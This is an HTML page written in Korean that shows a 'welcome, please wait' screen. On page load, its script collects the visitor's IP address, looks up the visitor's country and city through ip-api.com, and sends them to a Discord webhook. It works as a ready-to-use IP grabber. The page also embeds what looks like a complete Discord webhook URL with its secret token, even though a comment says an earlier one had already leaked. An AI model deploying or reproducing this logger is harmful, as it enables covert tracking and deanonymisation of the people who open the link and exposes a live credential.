<!DOCTYPE html>
<html lang="ko">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>접속 중...</title>
  <style>
    body {
      margin: 0;
      height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
      background: linear-gradient(135deg, #667eea, #764ba2);
      color: white;
      font-family: -apple-system, BlinkMacOSystemFont, 'Segoe UI', Roboto, sans-serif;
    }
    .container {
      text-align: center;
      background: rgba(255,255,255,0.12);
      padding: 50px 70px;
      border-radius: 24px;
      backdrop-filter: blur(12px);
      box-shadow: 0 10px 40px rgba(0,0,0,0.35);
      max-width: 420px;
    }
    h1 { margin: 0 0 16px; font-size: 2.4em; }
    p { margin: 0 0 24px; opacity: 0.9; font-size: 1.1em; }
    #status {
      font-size: 1.2em;
      padding: 16px;
      border-radius: 12px;
      background: rgba(0,0,0,0.25);
    }
  </style>
</head>
<body>

  <div class="container">
    <h1>어서오세요!</h1>
    <p>잠시만 기다려주세요...</p>
    <div id="status">접속 정보를 기록 중입니다...</div>
  </div>

  <script>
    window.addEventListener('load', async () => {
      const status = document.getElementById('status');

      try {
        // 1. 기본 IP 주소 가져오기
        const ipRes = await fetch('https://api.ipify.org?format=json');
        const { ip } = await ipRes.json();

        // 2. 위치 정보 추가 (무료 ip-api.com - 나라, 도시 등)
        const geoRes = await fetch(`http://ip-api.com/json/${ip}?fields=status,country,city`);
        const geo = await geoRes.json();

        const now = new Date().toISOString();

        // 3. Discord 임베드 페이로드 (더 보기 좋게 업그레이드)
        const payload = {
          username: "접속 알림",
          avatar_url: "https://i.imgur.com/8Z0Z0Z0.png", // 원하면 다른 아이콘으로 변경
          embeds: [{
            title: "새로운 방문자",
            color: 0x5865F2, // 디스코드 블루
            description: "누군가 페이지에 들어왔습니다",
            fields: [
              { name: "IP 주소", value: `\`${ip}\``, inline: true },
              { name: "위치", value: `${geo.country || '알 수 없음'} • ${geo.city || '알 수 없음'}`, inline: true },
              { name: "접속 시간", value: now, inline: false }
            ],
            footer: { 
              text: "Busan • 간단 로거", 
              icon_url: "https://i.imgur.com/favicon.ico" // 작은 아이콘 (선택)
            },
            timestamp: now
          }]
        };

        // ★ 여기에 **새로운** Discord 웹훅 URL을 넣으세요!
        // 이전에 공유된 건 이미 노출됐으니 반드시 삭제하고 새로 생성하세요
        const WEBHOOK_URL = "https://discord.com/api/webhooks/1462053317160206389/bVfSvki561cN0040ZjAEJfTe-Pr0eaAy2-2YUeuXAxCrqYd3agGzkMjAREjl5919c_TH";

        await fetch(WEBHOOK_URL, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(payload)
        });

        status.innerHTML = "접속 기록 완료 ✓";
        status.style.background = 'rgba(0,200,83,0.3)'; // 초록 톤

      } catch (err) {
        console.error('접속 기록 에러:', err);
        status.innerHTML = "기록 중 오류가 발생했어요...";
        status.style.background = 'rgba(220,53,69,0.3)'; // 빨강 톤
      }
    });
  </script>

</body>
</html>
